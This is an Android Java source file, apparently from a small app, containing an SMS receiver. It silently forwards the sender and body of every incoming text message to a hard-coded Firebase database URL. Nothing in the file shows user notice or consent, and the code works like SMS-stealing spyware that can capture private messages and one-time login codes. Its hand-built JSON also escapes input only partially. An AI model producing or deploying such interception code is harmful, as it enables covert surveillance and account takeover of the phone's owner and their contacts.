package com.akim_sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {

    private static final String FIREBASE_URL =
            "https://sms-akim-default-rtdb.firebaseio.com/sms.json";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() == null) return;
        if (!intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) return;

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            if (sms == null) continue;
            envoyerVersFirebase(sms.getOriginatingAddress(), sms.getMessageBody());
        }
    }

    private void envoyerVersFirebase(final String expediteur, final String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(FIREBASE_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    String exp = expediteur == null ? "" : expediteur.replace("\"", "'");
                    String msg = message == null ? "" : message.replace("\"", "'").replace("\n", " ");
                    String json = "{\"de\":\"" + exp + "\",\"msg\":\"" + msg + "\"}";

                    OutputStream os = conn.getOutputStream();
                    os.write(json.getBytes("UTF-8"));
                    os.flush();
                    os.close();
                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
